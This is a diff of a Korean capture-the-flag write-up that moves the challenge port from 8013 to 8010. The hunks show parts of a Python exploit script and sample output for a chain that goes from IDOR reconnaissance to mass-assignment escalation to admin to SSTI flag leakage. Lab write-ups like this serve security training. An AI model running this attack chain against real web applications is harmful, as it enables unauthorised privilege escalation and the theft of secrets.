@@ -6,7 +6,7 @@
 |---|---|
 | 분류 | Web / IDOR(정찰) → Mass Assignment(권한 상승) → SSTI(플래그 유출) |
 | 난이도 | Hard |
-| 접속 | `http://<출제조IP>:8013` |
+| 접속 | `http://<출제조IP>:8010` |
 | 시작 | 회원가입으로 계정 생성 (초기 role = `applicant`) |
 | 플래그 형식 | `GlassHouse{...}` (환경변수 `FLAG_SANTA`) |
 
@@ -219,15 +219,15 @@ preview = render_template("santa/card.html", to=to, message=message)
 ```python
 #!/usr/bin/env python3
 # hard-06 (시크릿 산타) - IDOR 정찰 -> Mass Assignment 승격 -> SSTI 플래그 유출
-# 사용: python3 exploit.py http://<IP>:8013
+# 사용: python3 exploit.py http://<IP>:8010
 import re
 import sys
 import requests
 
-BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8013"
+BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:8010"
 USER, PW = "hohoho01", "pw12345"      # 아이디에 admin/reviewer/staff 등 금지어만 피하면 됨
 
-s = requests.Session()  # 세션 쿠키(gh_8013) 자동 관리
+s = requests.Session()  # 세션 쿠키(gh_8010) 자동 관리
 
 # 0) 회원가입 (role 은 서버가 applicant 로 고정)
 s.post(f"{BASE}/signup", data={"username": USER, "password": PW, "password_confirm": PW,
@@ -256,7 +256,7 @@ print(f"[+] FLAG: {m.group(0)}" if m else "[-] 플래그를 찾지 못함 (승�
 
 실행 예시
 ```bash
-$ python3 exploit.py http://127.0.0.1:8013
+$ python3 exploit.py http://127.0.0.1:8010
 [*] logged in as applicant
 [*] IDOR /wishlist/13 -> 200  (운영진 memo 힌트: role을 admin으로)
 [*] mass-assign role=admin -> 302  (session.role=admin 승격)
